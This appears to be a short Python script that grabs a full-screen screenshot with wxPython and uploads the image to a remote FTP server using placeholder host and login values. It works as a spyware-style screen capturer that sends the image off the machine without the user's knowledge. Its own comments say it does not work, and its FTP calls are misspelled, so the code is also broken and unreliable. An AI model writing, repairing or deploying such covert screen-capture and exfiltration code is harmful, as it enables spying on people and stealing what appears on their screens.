#!/bin/python3

#Code will not work!
#Python GUI //Issues downloading wxPython


import wx
import os
import ftplib

w = wx.App() 
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wx.Bitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
memo.Blit(0,0,size[0],size[1],screen,0,0)

del memo
bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)

#Stores file in Remote FTP server
sess_ = ftplib.FTP("IP_of_FTP","user","password") #Stores .png remote server
file_ = open("grabbed.png", "rb")
sess_.storebinary("STORE /tmp/grabbed.png", file_)

file_.close()
sess_.quit()
